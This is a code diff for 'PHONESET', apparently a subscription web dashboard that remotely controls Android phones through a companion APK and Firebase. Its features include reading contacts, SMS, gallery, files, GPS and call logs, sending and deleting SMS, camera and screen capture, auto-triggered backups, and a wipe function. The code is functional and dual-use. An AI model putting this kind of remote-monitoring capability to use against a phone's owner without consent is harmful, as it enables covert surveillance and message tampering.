+  const email = document.getElementById('login-email').value.trim();
+  const password = document.getElementById('login-pin').value;
+  const errEl = document.getElementById('login-error');
+  errEl.textContent = '';
+  if (!email || !password) { errEl.textContent = 'Email dan password wajib diisi'; return; }
+  this.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Memuat...';
+  this.disabled = true;
+  try {
+    await auth.signInWithEmailAndPassword(email, password);
+  } catch(e) {
+    errEl.textContent = getAuthErrorMsg(e.code);
+    this.innerHTML = '<i class="fa-solid fa-right-to-bracket"></i> MASUK';
+    this.disabled = false;
+  }
+};
+
+document.getElementById('btn-daftar').onclick = async function() {
+  const name = document.getElementById('reg-name').value.trim();
+  const email = document.getElementById('reg-email').value.trim();
+  const pin = document.getElementById('reg-pin').value;
+  const pin2 = document.getElementById('reg-pin2').value;
+  const errEl = document.getElementById('reg-error');
+  errEl.textContent = '';
+  if (!name || !email || !pin) { errEl.textContent = 'Semua kolom wajib diisi'; return; }
+  if (pin.length < 6) { errEl.textContent = 'Password minimal 6 karakter'; return; }
+  if (pin !== pin2) { errEl.textContent = 'Konfirmasi password tidak cocok'; return; }
+  this.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Mendaftar...';
+  this.disabled = true;
+  try {
+    const cred = await auth.createUserWithEmailAndPassword(email, pin);
+    await cred.user.updateProfile({ displayName: name });
+    await saveUserProfile(cred.user, name);
+    showToast('✅ Akun berhasil dibuat!');
+  } catch(e) {
+    document.getElementById('reg-error').textContent = getAuthErrorMsg(e.code);
+    this.innerHTML = '<i class="fa-solid fa-user-plus"></i> DAFTAR';
+    this.disabled = false;
+  }
+};
+
+// ============================================================
+// AUTH — LOGOUT & STATE
+// ============================================================
+function logout() {
+  if (!confirm('Yakin ingin keluar?')) return;
+  auth.signOut();
+}
+
+auth.onAuthStateChanged(user => {
+  if (user) {
+    currentUser = user;
+    const displayName = user.displayName || user.email;
+    document.getElementById('dash-user-email').textContent = displayName;
+    if (user.email === ADMIN_EMAIL) {
+      document.getElementById('admin-email').textContent = user.email;
+      showScreen('screen-admin');
+      loadAdminSubscriptions();
+    } else {
+      showScreen('screen-dashboard');
+      loadDevices();
+      listenSubscription();
+    }
+  } else {
+    currentUser = null;
+    currentDevice = null;
+    detachDataListeners();
+    subscriptionData = null;
+    showScreen('screen-login');
+    const btnMasuk = document.getElementById('btn-masuk');
+    const btnDaftar = document.getElementById('btn-daftar');
+    if (btnMasuk) { btnMasuk.innerHTML = '<i class="fa-solid fa-right-to-bracket"></i> MASUK'; btnMasuk.disabled = false; }
+    if (btnDaftar) { btnDaftar.innerHTML = '<i class="fa-solid fa-user-plus"></i> DAFTAR'; btnDaftar.disabled = false; }
+  }
+});
+
+// ============================================================
+// DEVICES
+// ============================================================
+let deviceDeleteMode = false;
+let selectedDeviceIds = new Set();
+
+function loadDevices() {
+  if (!currentUser) return;
+  const ref = db.ref(`phoneset/users/${currentUser.uid}/devices`);
+  ref.on('value', snap => {
+    const el = document.getElementById('device-list');
+    const devices = snap.val();
+    if (!devices) {
+      el.innerHTML = `<div class="no-devices"><i class="fa-solid fa-mobile-screen-button"></i><p>Belum ada perangkat terdaftar.<br>Install aplikasi PHONESET di Android Anda.</p></div>`;
+      return;
+    }
+    el.innerHTML = '';
+    Object.entries(devices).forEach(([id, d]) => {
+      const online = d.info?.lastSeen && (Date.now() - d.info.lastSeen) < 5 * 60 * 1000;
+      const last = d.info?.lastSeen ? formatDate(d.info.lastSeen) : 'Tidak diketahui';
+      const batt = d.info?.battery != null ? ` · 🔋 ${d.info.battery}%` : '';
+      const androidVer = d.info?.android ? ` · ${d.info.android}` : '';
+      const isSelected = selectedDeviceIds.has(id);
+      const div = document.createElement('div');
+      div.className = `device-card ${online ? '' : 'offline'}${isSelected ? ' selected' : ''}`;
+      div.dataset.deviceId = id;
+      if (deviceDeleteMode) {
+        div.innerHTML = `
+          <div class="device-checkbox">${isSelected ? '<i class="fa-solid fa-check" style="font-size:0.8rem"></i>' : ''}</div>
+          <div class="device-info" style="flex:1">
+            <h3>${htmlEscape(d.info?.name || 'Perangkat')}</h3>
+            <p style="font-size:0.8rem;color:#666">${htmlEscape(d.info?.model || '')}${htmlEscape(androidVer)}${htmlEscape(batt)}</p>
+            <p style="font-size:0.72rem;margin-top:2px;color:#999">Terakhir aktif: ${last}</p>
+          </div>
+        `;
+        div.onclick = () => toggleDeviceSelect(id);
+      } else {
+        div.innerHTML = `
+          <div class="device-icon">📱</div>
+          <div class="device-info">
+            <h3>${htmlEscape(d.info?.name || 'Perangkat')}</h3>
+            <p style="font-size:0.8rem;color:#666">${htmlEscape(d.info?.model || '')}${htmlEscape(androidVer)}${htmlEscape(batt)}</p>
+            <p style="font-size:0.72rem;margin-top:2px;color:#999">Terakhir aktif: ${last}</p>
+          </div>
+          <div class="status-dot ${online ? 'online' : 'offline'}"></div>
+        `;
+        div.onclick = () => selectDevice(id, d);
+      }
+      el.appendChild(div);
+    });
+  });
+}
+
+function toggleDeleteMode() {
+  deviceDeleteMode = !deviceDeleteMode;
+  selectedDeviceIds.clear();
+  const bar = document.getElementById('delete-mode-bar');
+  const label = document.getElementById('device-section-label');
+  const btn = document.getElementById('btn-manage-devices');
+  if (deviceDeleteMode) {
+    bar.classList.add('visible');
+    if (label) label.textContent = 'Pilih perangkat untuk dihapus';
+    if (btn) { btn.style.background = 'rgba(239,68,68,0.3)'; btn.style.color = '#f87171'; }
+  } else {
+    bar.classList.remove('visible');
+    if (label) label.textContent = 'Perangkat Aktif';
+    if (btn) { btn.style.background = 'rgba(255,255,255,0.12)'; btn.style.color = '#f87171'; }
+  }
+  loadDevices();
+}
+
+function toggleDeviceSelect(id) {
+  if (selectedDeviceIds.has(id)) {
+    selectedDeviceIds.delete(id);
+  } else {
+    selectedDeviceIds.add(id);
+  }
+  const count = selectedDeviceIds.size;
+  const countEl = document.getElementById('delete-count');
+  if (countEl) countEl.textContent = `${count} perangkat dipilih`;
+  const card = document.querySelector(`.device-card[data-device-id="${id}"]`);
+  if (card) {
+    card.classList.toggle('selected', selectedDeviceIds.has(id));
+    const cb = card.querySelector('.device-checkbox');
+    if (cb) cb.innerHTML = selectedDeviceIds.has(id) ? '<i class="fa-solid fa-check" style="font-size:0.8rem"></i>' : '';
+  }
+}
+
+async function deleteSelectedDevices() {
+  if (selectedDeviceIds.size === 0) { showToast('Pilih perangkat terlebih dahulu'); return; }
+  const names = [];
+  selectedDeviceIds.forEach(id => {
+    const card = document.querySelector(`.device-card[data-device-id="${id}"]`);
+    const h3 = card?.querySelector('h3');
+    names.push(h3?.textContent || id);
+  });
+  if (!confirm(`Hapus ${selectedDeviceIds.size} perangkat berikut?\n\n${names.join('\n')}\n\nData perangkat di server akan dihapus permanen.`)) return;
+  const promises = [];
+  selectedDeviceIds.forEach(id => {
+    promises.push(db.ref(`phoneset/users/${currentUser.uid}/devices/${id}`).remove());
+  });
+  try {
+    await Promise.all(promises);
+    showToast(`✅ ${promises.length} perangkat berhasil dihapus`);
+  } catch(e) {
+    showToast('❌ Gagal menghapus: ' + e.message);
+  }
+  toggleDeleteMode();
+}
+
+function selectDevice(id, d) {
+  // Detach all previous real-time listeners before switching device
+  detachDataListeners();
+
+  currentDevice = { id, ...d };
+  document.getElementById('dh-title').textContent = d.info?.name || 'Perangkat';
+  document.getElementById('dh-device-name').textContent = (d.info?.model || '') + ' · ' + (d.info?.brand || '');
+  const statusEl = document.getElementById('dh-status');
+  const lastSeen = d.info?.lastSeen || 0;
+  const isOnline = (Date.now() - lastSeen) < 5 * 60 * 1000;
+  statusEl.className = `d-status ${isOnline ? 'online' : 'offline'}`;
+  statusEl.innerHTML = `<i class="fa-solid fa-circle" style="font-size:0.5rem"></i> ${isOnline ? 'Online' : 'Offline'}`;
+  document.getElementById('dh-last-seen').textContent = d.info?.lastSeen ? formatDate(d.info.lastSeen) : '';
+
+  // Real-time device info listener (managed)
+  const syncText = document.getElementById('dh-sync-text');
+  attachDataListener('deviceInfo', db.ref(getDevicePath('info')), snap => {
+    const info = snap.val();
+    if (!info) return;
+    const batt = info.battery;
+    const battStr = batt !== undefined ? ` · 🔋 ${batt}%` : '';
+    const android = info.android ? ` · ${info.android}` : '';
+    if (syncText) syncText.textContent = `Firebase aktif${battStr}${android}`;
+    // Update online status dynamically
+    const ls = info.lastSeen || 0;
+    const online = (Date.now() - ls) < 5 * 60 * 1000;
+    statusEl.className = `d-status ${online ? 'online' : 'offline'}`;
+    statusEl.innerHTML = `<i class="fa-solid fa-circle" style="font-size:0.5rem"></i> ${online ? 'Online' : 'Offline'}`;
+  });
+
+  // Listen to backup_timestamp to show last sync time
+  attachDataListener('backupTs', db.ref(getDevicePath('backup_timestamp')), snap => {
+    const ts = snap.val();
+    const el = document.getElementById('dh-last-seen');
+    if (el && ts) el.textContent = 'Backup: ' + formatDate(ts);
+  });
+
+  // Auto-trigger backup after 4 seconds so data is always fresh
+  setTimeout(() => {
+    if (currentDevice && currentDevice.id === id) {
+      const btn = document.getElementById('btn-backup');
+      if (btn) { btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Sinkronisasi...'; }
+      sendCommand('backup', true);
+      setTimeout(() => {
+        if (btn) btn.innerHTML = '<i class="fa-solid fa-cloud-arrow-up"></i> BACKUP SEKARANG';
+      }, 8000);
+    }
+  }, 4000);
+
+  showScreen('screen-device-home');
+}
+
+function listenSubscription() {
+  if (!currentUser) return;
+  attachDataListener('subscription', db.ref(`phoneset/users/${currentUser.uid}/subscription`), snap => {
+    subscriptionData = snap.val() || null;
+    renderSubscriptionStatus();
+  });
+}
+
+function hasActiveSubscription() {
+  return !!(subscriptionData?.activeUntil && subscriptionData.activeUntil > Date.now());
+}
+
+function renderSubscriptionStatus() {
+  const el = document.getElementById('subscription-status');
+  if (!el) return;
+  if (hasActiveSubscription()) {
+    el.textContent = `Aktif sampai ${formatDate(subscriptionData.activeUntil)}`;
+  } else if (subscriptionData?.pending?.status === 'waiting_confirmation') {
+    el.textContent = 'Menunggu verifikasi admin';
+  } else {
+    el.textContent = 'Belum aktif';
+  }
+}
+
+function openSubscriptionModal() {
+  openModal('modal-subscription');
+}
+
+function setNominal(amount, days, btn) {
+  selectedPlanAmount = amount;
+  selectedPlanDays = days;
+  document.getElementById('amount-input').value = amount;
+  document.querySelectorAll('.btn-nominal').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+}
+
+function crc16(data) {
+  let crc = 0xFFFF;
+  for (let i = 0; i < data.length; i++) {
+    crc ^= data.charCodeAt(i) << 8;
+    for (let j = 0; j < 8; j++) {
+      crc = (crc & 0x8000) !== 0 ? (crc << 1) ^ 0x1021 : crc << 1;
+    }
+  }
+  return (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
+}
+
+function generateQR() {
+  if (!selectedPlanAmount || !selectedPlanDays) {
+    showToast('Pilih paket terlebih dahulu');
+    return;
+  }
+  const amount = String(selectedPlanAmount);
+  const qrisTanpaCRC = QRIS_BASE.split('6304')[0];
+  const tagNominal = '54' + amount.length.toString().padStart(2, '0') + amount;
+  const dataSiapCRC = qrisTanpaCRC + tagNominal + '6304';
+  const fullQRIS = dataSiapCRC + crc16(dataSiapCRC);
+
+  document.getElementById('qrcode').innerHTML = '';
+  new QRCode(document.getElementById('qrcode'), {
+    text: fullQRIS, width: 200, height: 200, correctLevel: QRCode.CorrectLevel.M
+  });
+  currentSubscriptionTrxId = 'SUB-' + Math.floor(Date.now() / 1000);
+  document.getElementById('total-display').innerText = 'Rp ' + selectedPlanAmount.toLocaleString('id-ID');
+  document.getElementById('tr-id').innerText = 'TRX-ID: ' + currentSubscriptionTrxId;
+  document.getElementById('qr-container').style.display = 'block';
+
+  let time = 180;
+  clearInterval(qrisTimer);
+  qrisTimer = setInterval(() => {
+    const m = Math.floor(time / 60);
+    const s = time % 60;
+    document.getElementById('pay-timer').innerText = `Selesaikan dalam ${m}:${s < 10 ? '0' : ''}${s}`;
+    if (time-- <= 0) {
+      clearInterval(qrisTimer);
+      document.getElementById('qr-container').style.opacity = '0.5';
+      showToast('Waktu pembayaran habis');
+    }
+  }, 1000);
+}
+
+function downloadQR() {
+  html2canvas(document.getElementById('capture-area')).then(canvas => {
+    const link = document.createElement('a');
+    link.download = `QRIS-PHONESET-${Date.now()}.png`;
+    link.href = canvas.toDataURL();
+    link.click();
+  });
+}
+
+function confirmSubscriptionPayment() {
+  if (!currentUser || !selectedPlanAmount || !selectedPlanDays || !currentSubscriptionTrxId) {
+    showToast('Buat QR pembayaran terlebih dahulu');
+    return;
+  }
+  db.ref(`phoneset/users/${currentUser.uid}/subscription/pending`).set({
+    days: selectedPlanDays,
+    amount: selectedPlanAmount,
+    trxId: currentSubscriptionTrxId,
+    status: 'waiting_confirmation',
+    requestedAt: Date.now()
+  });
+  const msg = encodeURIComponent(
+    `Halo Admin, saya sudah membayar paket PhoneSet ${selectedPlanDays} hari sebesar Rp ${selectedPlanAmount.toLocaleString('id-ID')}. TRX-ID: ${currentSubscriptionTrxId}. Saya akan kirim bukti transfer pembayaran.`
+  );
+  window.open(`https://wa.me/6283872543697?text=${msg}`, '_blank');
+}
+
+function loadAdminSubscriptions() {
+  attachDataListener('adminSubscriptions', db.ref('phoneset/users'), snap => {
+    const users = snap.val() || {};
+    const rows = [];
+    Object.entries(users).forEach(([uid, userData]) => {
+      const pending = userData.subscription?.pending;
+      if (pending?.status === 'waiting_confirmation') {
+        rows.push({
+          uid,
+          email: userData.profile?.email || userData.email || uid,
+          ...pending
+        });
+      }
+    });
+    rows.sort((a, b) => (b.requestedAt || 0) - (a.requestedAt || 0));
+    renderAdminSubscriptions(rows);
+  });
+}
+
+function renderAdminSubscriptions(rows) {
+  const el = document.getElementById('admin-subscription-list');
+  if (!rows.length) {
+    el.innerHTML = '<div class="card-sm" style="text-align:center">Tidak ada permintaan menunggu konfirmasi</div>';
+    return;
+  }
+  el.innerHTML = rows.map(r => `
+    <div class="card-sm" style="margin:0 0 10px 0">
+      <div style="font-weight:700">${htmlEscape(r.email || r.uid)}</div>
+      <div style="font-size:0.8rem;color:#666;margin-top:4px">
+        Paket ${r.days || '-'} hari · Rp ${(r.amount || 0).toLocaleString('id-ID')} · ${htmlEscape(r.trxId || '-')}
+      </div>
+      <div style="font-size:0.75rem;color:#888;margin-top:2px">${formatDate(r.requestedAt)}</div>
+      <button class="btn btn-green btn-sm" style="margin-top:10px" onclick="approveSubscription('${r.uid}', ${Number(r.days || 0)}, '${String(r.trxId || '').replace(/'/g, "\\'")}')">
+        <i class="fa-solid fa-check"></i> Aktifkan
+      </button>
+    </div>
+  `).join('');
+}
+
+function approveSubscription(uid, days, trxId) {
+  if (!days || !confirm(`Aktifkan paket ${days} hari untuk pengguna ini?`)) return;
+  const subRef = db.ref(`phoneset/users/${uid}/subscription`);
+  subRef.once('value', snap => {
+    const current = snap.val() || {};
+    const base = Math.max(Date.now(), Number(current.activeUntil || 0));
+    const activeUntil = base + days * 24 * 60 * 60 * 1000;
+    subRef.update({
+      activeUntil,
+      pending: {
+        ...(current.pending || {}),
+        status: 'approved',
+        approvedAt: Date.now(),
+        approvedBy: currentUser.email,
+        trxId
+      }
+    }).then(() => showToast('Paket berhasil diaktifkan'))
+      .catch(e => showToast('Gagal mengaktifkan: ' + e.message));
+  });
+}
+
+// ============================================================
+// BACKUP
+// ============================================================
+document.getElementById('btn-backup').onclick = function() {
+  this.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Sinkronisasi...';
+  this.disabled = true;
+  const btn = this;
+  sendCommand('backup', true);
+  showToast('☁️ Backup dimulai — data akan diperbarui otomatis');
+  setTimeout(() => { btn.innerHTML = '<i class="fa-solid fa-cloud-arrow-up"></i> BACKUP SEKARANG'; btn.disabled = false; }, 8000);
+};
+
+function sendCommand(type, value, silent = false) {
+  if (!currentDevice) return;
+  const cmdId = Date.now() + '_' + Math.random().toString(36).slice(2, 7);
+  db.ref(getDevicePath(`commands/${cmdId}`)).set({
+    type: type,
+    value: value,
+    status: 'pending',
+    timestamp: Date.now()
+  });
+  if (!silent) showToast('✅ Perintah dikirim ke perangkat');
+}
+
+// ============================================================
+// FEATURE DATA LOADERS
+// ============================================================
+function loadFeatureData(feature) {
+  if (!currentDevice) return;
+  switch(feature) {
+    case 'contacts': loadContacts(); break;
+    case 'sms': loadSms(); break;
+    case 'gallery': loadGallery(); break;
+    case 'files': loadFiles('/'); break;
+    case 'camera': loadCameraResults(); break;
+    case 'gps': loadGPS(); break;
+    case 'calls': loadCalls(); break;
+    case 'screen-ctrl': loadScreenshots(); break;
+    case 'wipe': /* no data to load */ break;
+  }
+}
+
+// ============================================================
+// CONTACTS
+// ============================================================
+function loadContacts() {
+  const el = document.getElementById('contacts-list');
+  el.innerHTML = '<div class="loader"><div class="spinner" style="border-top-color:var(--green)"></div></div>';
+  attachDataListener('contacts', db.ref(getDevicePath('contacts')), snap => {
+    const data = snap.val();
+    contactsData = data ? Object.entries(data).map(([id, v]) => ({id, ...v})) : [];
+    renderContacts(contactsData);
+  });
+}
+
+function renderContacts(list) {
+  const el = document.getElementById('contacts-list');
+  if (!list.length) { el.innerHTML = '<div class="empty-state"><i class="fa-solid fa-address-book"></i><p>Tidak ada kontak</p></div>'; return; }
+  contactsMap = {};
+  list.forEach(c => { contactsMap[c.id] = c; });
+  el.innerHTML = list.map(c => `
+    <div class="list-item">
+      <div class="list-avatar" style="background:${getAvatarColor(c.name)}">${getInitials(c.name)}</div>
+      <div class="list-item-info">
+        <div class="name">${htmlEscape(c.name || 'Tanpa Nama')}</div>
+        <div class="sub">${htmlEscape(c.phone || '')}</div>
+      </div>
+      <div class="list-actions">
+        <button class="icon-action ia-yellow" onclick="openEditContact('${c.id}')"><i class="fa-solid fa-pen"></i></button>
+        <button class="icon-action ia-red" onclick="deleteContact('${c.id}')"><i class="fa-solid fa-trash"></i></button>
+      </div>
+    </div>
+  `).join('');
+}
+
+function filterContacts(q) {
+  const f = contactsData.filter(c => (c.name||'').toLowerCase().includes(q.toLowerCase()) || (c.phone||'').includes(q));
+  renderContacts(f);
+}
+
+function openEditContact(id) {
+  const c = contactsMap[id] || {};
+  document.querySelector('#modal-contact-edit .modal-title').textContent = 'Edit Kontak';
+  document.getElementById('edit-contact-id').value = id;
+  document.getElementById('edit-contact-name').value = c.name || '';
+  document.getElementById('edit-contact-phone').value = c.phone || '';
+  document.getElementById('edit-contact-email').value = c.email || '';
+  openModal('modal-contact-edit');
+}
+
+function openAddContact() {
+  document.querySelector('#modal-contact-edit .modal-title').textContent = 'Tambah Kontak';
+  document.getElementById('edit-contact-id').value = '';
+  document.getElementById('edit-contact-name').value = '';
+  document.getElementById('edit-contact-phone').value = '';
+  document.getElementById('edit-contact-email').value = '';
+  openModal('modal-contact-edit');
+}
+
+function saveContact() {
+  const id = document.getElementById('edit-contact-id').value;
+  const name = document.getElementById('edit-contact-name').value.trim();
+  const phone = document.getElementById('edit-contact-phone').value.trim();
+  const email = document.getElementById('edit-contact-email').value.trim();
+  if (!name || !phone) { showToast('Nama dan nomor wajib diisi'); return; }
+  if (id) {
+    db.ref(getDevicePath(`contacts/${id}`)).update({ name, phone, email });
+    sendCommand('update_contact', { id, name, phone, email });
+  } else {
+    sendCommand('add_contact', { name, phone, email });
+  }
+  closeModal('modal-contact-edit');
+  showToast('✅ Kontak disimpan');
+  loadContacts();
+}
+
+function deleteContact(id) {
+  if (!confirm('Hapus kontak ini?')) return;
+  db.ref(getDevicePath(`contacts/${id}`)).remove();
+  sendCommand('delete_contact', id);
+  showToast('🗑️ Kontak dihapus');
+  loadContacts();
+}
+
+// ============================================================
+// SMS
+// ============================================================
+function loadSms() {
+  const el = document.getElementById('sms-list');
+  el.innerHTML = '<div class="loader"><div class="spinner" style="border-top-color:var(--green)"></div></div>';
+  attachDataListener('sms', db.ref(getDevicePath('sms')), snap => {
+    const data = snap.val();
+    if (!data) { smsData = []; renderSms(smsData); return; }
+    // APK stores SMS as: {threadId: {address, lastDate, messages: {msgId: {id,body,date,type}}}}
+    smsData = Object.entries(data).map(([threadId, thread]) => {
+      const address = thread.address || '';
+      // Flatten nested messages object to array
+      const msgs = thread.messages && typeof thread.messages === 'object'
+        ? Object.values(thread.messages).map(m => ({...m, address}))
+        : [];
+      return {
+        id: threadId,
+        address,
+        name: thread.name || address || 'Tidak Dikenal',
+        messages: msgs.sort((a,b) => (b.date||0) - (a.date||0)),
+        lastDate: thread.lastDate || (msgs[0]?.date || 0)
+      };
+    }).sort((a,b) => (b.lastDate||0) - (a.lastDate||0));
+    renderSms(smsData);
+  });
+}
+
+function renderSms(list) {
+  const el = document.getElementById('sms-list');
+  if (!list.length) { el.innerHTML = '<div class="empty-state"><i class="fa-solid fa-comment-sms"></i><p>Tidak ada pesan</p></div>'; return; }
+  el.innerHTML = list.map(t => {
+    const last = t.messages.sort((a,b) => (b.date||0)-(a.date||0))[0];
+    const preview = htmlEscape((last?.body || '').slice(0, 40)) + ((last?.body||'').length > 40 ? '…' : '');
+    return `
+      <div class="list-item" onclick="openSmsThread('${t.id}')">
+        <div class="list-avatar" style="background:${getAvatarColor(t.name)}">${getInitials(t.name)}</div>
+        <div class="list-item-info">
+          <div class="name">${htmlEscape(t.name || t.address || 'Tidak Dikenal')}</div>
+          <div class="sub">${preview}</div>
+        </div>
+        <div style="font-size:0.7rem;color:var(--text-muted);flex-shrink:0;text-align:right">
+          ${last?.date ? formatDate(last.date).split(' ')[0] : ''}
+        </div>
+      </div>
+    `;
+  }).join('');
+}
+
+function filterSms(q) {
+  const f = smsData.filter(t => (t.name||'').toLowerCase().includes(q.toLowerCase()) || (t.address||'').includes(q));
+  renderSms(f);
+}
+
+function openSmsThread(threadId) {
+  currentSmsThread = smsData.find(t => t.id === threadId);
+  if (!currentSmsThread) return;
+  document.getElementById('sms-detail-name').textContent = currentSmsThread.name || currentSmsThread.address;
+  const msgs = [...currentSmsThread.messages].sort((a,b) => (a.date||0)-(b.date||0));
+  const chatEl = document.getElementById('chat-messages');
+  chatEl.innerHTML = msgs.map(m => {
+    const out = m.type === 2; // 1=inbox, 2=sent
+    return `
+      <div>
+        <div class="chat-bubble ${out ? 'bubble-out' : 'bubble-in'}">
+          ${htmlEscape(m.body || '')}
+          <div class="bubble-time">${formatDate(m.date)}</div>
+        </div>
+      </div>
+    `;
+  }).join('');
+  chatEl.scrollTop = chatEl.scrollHeight;
+  showScreen('screen-sms-detail');
+}
+
+function sendReply() {
+  const input = document.getElementById('chat-reply-input');
+  const body = input.value.trim();
+  if (!body || !currentSmsThread) return;
+  sendCommand('send_sms', { to: currentSmsThread.address, body });
+  const chatEl = document.getElementById('chat-messages');
+  chatEl.innerHTML += `
+    <div>
+      <div class="chat-bubble bubble-out">
+        ${htmlEscape(body)}
+        <div class="bubble-time">Baru saja (mengirim...)</div>
+      </div>
+    </div>
+  `;
+  input.value = '';
+  chatEl.scrollTop = chatEl.scrollHeight;
+  showToast('📤 Pesan dikirim');
+}
+
+function deleteSmsThread() {
+  if (!currentSmsThread || !confirm('Hapus semua percakapan ini?')) return;
+  // Delete the whole thread (APK stores by threadId, not individual msgId)
+  db.ref(getDevicePath(`sms/${currentSmsThread.id}`)).remove();
+  sendCommand('delete_sms', currentSmsThread.address);
+  showToast('🗑️ Percakapan dihapus');
+  showScreen('screen-sms');
+  loadSms();
+}
+
+function openSendSms() { openModal('modal-send-sms'); }
+
+function sendNewSms() {
+  const to = document.getElementById('sms-to-number').value.trim();
+  const body = document.getElementById('sms-body').value.trim();
+  if (!to || !body) { showToast('Nomor dan pesan wajib diisi'); return; }
+  sendCommand('send_sms', { to, body });
+  closeModal('modal-send-sms');
+  document.getElementById('sms-to-number').value = '';
+  document.getElementById('sms-body').value = '';
+  showToast('📤 SMS dikirim ke ' + to);
+}
+
+// ============================================================
+// GALLERY
+// ============================================================
+let galleryFilter = 'all';
+function loadGallery() {
+  const el = document.getElementById('gallery-grid');
+  el.innerHTML = '<div class="loader" style="grid-column:1/-1"><div class="spinner"></div></div>';
+  attachDataListener('gallery', db.ref(getDevicePath('gallery')), snap => {
+    const data = snap.val();
+    galleryData = data ? Object.entries(data).map(([id, v]) => ({id, ...v})) : [];
+    renderGallery();
+  });
+}
+
+function filterGallery(type) {
+  galleryFilter = type;
+  const typeToKey = { all: 'all', image: 'img', video: 'vid' };
+  const activeKey = typeToKey[type] || 'all';
+  ['all','img','vid'].forEach(k => {
+    const btn = document.getElementById('gf-' + k);
+    if (btn) btn.className = `btn btn-sm ${k === activeKey ? 'btn-green' : 'btn-outline'}`;
+  });
+  renderGallery();
+}
+
+function renderGallery() {
+  const el = document.getElementById('gallery-grid');
+  let list = galleryData;
+  if (galleryFilter === 'image') list = list.filter(g => g.type === 'image');
+  if (galleryFilter === 'video') list = list.filter(g => g.type === 'video');
+  if (!list.length) {
+    el.innerHTML = `<div class="empty-state" style="grid-column:1/-1">
+      <i class="fa-solid fa-images"></i>
+      <p>Tidak ada media</p>
+      <p style="font-size:0.78rem;color:#888;margin-top:4px">Pastikan APK berjalan dan izin media sudah diberikan.<br>Tekan BACKUP SEKARANG di halaman perangkat.</p>
+    </div>`;
+    return;
+  }
+  const withUrl = list.filter(g => g.url && g.url.startsWith('http')).length;
+  const total = list.length;
+  const infoBar = withUrl < total
+    ? `<div style="grid-column:1/-1;background:rgba(250,204,21,0.12);border:1px solid rgba(250,204,21,0.3);border-radius:10px;padding:10px 12px;font-size:0.78rem;color:#fde68a;display:flex;align-items:center;gap:8px">
+        <i class="fa-solid fa-cloud-arrow-up" style="flex-shrink:0"></i>
+        <span><b>${withUrl}/${total}</b> file sudah tersedia di penyimpanan online. Sisanya: tap item lalu tekan <b>Unduh</b> untuk meminta dari perangkat.</span>
+      </div>` : '';
+  el.innerHTML = infoBar + list.map(g => {
+    const hasUrl = g.url && g.url.startsWith('http');
+    let mediaEl;
+    if (hasUrl && g.type === 'video') {
+      mediaEl = `
+        <video src="${g.url}" style="width:100%;height:100%;object-fit:cover" muted preload="metadata"
+          onerror="this.style.display='none'"></video>
+        <div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;pointer-events:none">
+          <div style="background:rgba(0,0,0,0.6);border-radius:50%;width:40px;height:40px;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(2px)">
+            <i class="fa-solid fa-play" style="color:white;font-size:1rem;margin-left:3px"></i>
+          </div>
+        </div>`;
+    } else if (hasUrl) {
+      mediaEl = `
+        <img src="${g.url}" alt="${htmlEscape(g.name||'')}" loading="lazy" style="width:100%;height:100%;object-fit:cover"
+          onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
+        <div style="display:none;width:100%;height:100%;align-items:center;justify-content:center;background:#1a1a2e">
+          <i class="fa-solid fa-image" style="font-size:1.3rem;color:#555"></i>
+        </div>`;
+    } else {
+      mediaEl = `
+        <div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;flex-direction:column;background:#1a1a2e;gap:4px">
+          <i class="fa-solid ${g.type === 'video' ? 'fa-video' : 'fa-image'}" style="font-size:1.4rem;color:#4b5563"></i>
+          <span style="font-size:0.52rem;color:#6b7280;text-align:center;padding:0 4px">${htmlEscape((g.name||'').slice(0,14)) || '⬇ tap unduh'}</span>
+        </div>`;
+    }
+    const sizeLabel = g.size ? `<span style="position:absolute;bottom:2px;left:3px;background:rgba(0,0,0,0.75);color:white;font-size:0.52rem;padding:1px 3px;border-radius:3px">${formatSize(g.size)}</span>` : '';
+    return `
+    <div class="gallery-item" onclick="viewGalleryItem('${g.id}')">
+      ${mediaEl}
+      <span class="media-type">${g.type === 'video' ? '🎬' : '📷'}</span>
+      ${sizeLabel}
+    </div>`;
+  }).join('');
+}
+
+function viewGalleryItem(id) {
+  currentGalleryItem = galleryData.find(g => g.id === id);
+  if (!currentGalleryItem) return;
+  const container = document.getElementById('gallery-view-container');
+  const nameEl = document.getElementById('gallery-view-name');
+  const reqEl = document.getElementById('gallery-req-status');
+  if (nameEl) nameEl.textContent = currentGalleryItem.name || '';
+  if (reqEl) reqEl.style.display = 'none';
+  const url = currentGalleryItem.url || '';
+  container.innerHTML = url
+    ? buildMediaPreviewHtml(url, currentGalleryItem.name || 'media', {
+        maxHeight: '64vh',
+        compact: true,
+        mediaTypeHint: currentGalleryItem.type
+      })
+    : `<div style="color:#666;padding:40px;text-align:center">
+         <i class="fa-solid ${currentGalleryItem.type === 'video' ? 'fa-video' : 'fa-image'} fa-2x"></i>
+         <p style="margin-top:8px;font-size:0.85rem">Pratinjau belum tersedia<br>Tekan Unduh untuk meminta dari perangkat</p>
+       </div>`;
+  openModal('modal-gallery-view');
+  if (url && resolveMediaType(url, currentGalleryItem.name || 'media', currentGalleryItem.type) === 'image') {
+    renderCanvasPreviews(container);
+  }
+  if (!url) requestGalleryPreview();
+}
+
+function downloadGalleryItem() {
+  if (!currentGalleryItem) return;
+  if (currentGalleryItem.url) {
+    downloadViaProxy(currentGalleryItem.url, currentGalleryItem.name || 'media');
+  } else {
+    // Request APK to upload this gallery item to object storage
+    sendCommand('upload_gallery', { id: currentGalleryItem.id, uri: currentGalleryItem.uri || '' });
+    const reqEl = document.getElementById('gallery-req-status');
+    if (reqEl) { reqEl.style.display = 'block'; reqEl.textContent = '⏳ Meminta file dari perangkat... tunggu beberapa saat'; }
+    showToast('📤 Meminta file dari perangkat...');
+    // Poll Firebase until URL appears (max 60 sec)
+    const ref = db.ref(getDevicePath(`gallery/${currentGalleryItem.id}/url`));
+    let attempts = 0;
+    const poll = () => {
+      ref.once('value', snap => {
+        const url = snap.val();
+        if (url) {
+          currentGalleryItem.url = url;
+          if (reqEl) reqEl.style.display = 'none';
+          downloadViaProxy(url, currentGalleryItem.name || 'media');
